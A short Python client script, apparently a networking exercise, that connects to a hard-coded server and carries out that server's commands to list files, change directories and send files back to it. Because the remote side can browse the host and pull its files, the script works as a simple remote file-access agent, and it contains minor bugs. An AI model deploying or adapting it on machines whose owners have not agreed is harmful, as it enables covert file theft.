from tools import *
import socket
import os

server_addr = "172.23.114.97"
server_port = 8899

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_addr, server_port))

pwd = os.getcwd()
data = {'pwd': pwd}
send_data(client, data)


def download(client: socket.socket, name: str):
    #检查路径是否存在
    if os.path.exists(name):
        send_data(client, {"status": 1})
        file = open(data["name"], "rb")
        content = file.read()
        file.close()
        send_data(client, {"content": content})
    else:
        send_data(client, {"status": -1})

while True:
    data = recv_data(client)
    if data["cmd"] == "ls":
        files = os.listdir()
        types = []
        for file in files:
            if os.path.isfile(file):
                types.append(1)
            else:
                types.append(0)
        res = {"files": files, "types": types}
        send_data(client, res)
    if data["cmd"] == "exit":
        client.close()
    if data["cmd"] == "cd":
        try:
            os.chdir(data["path"])
            send_data(client, {"pwd": os.getcwd()})
        except Exception as e:
            send_data(client, {"pwd": "error", "error": e})
    if data["cmd"] == "download":
        download(client, data["name"])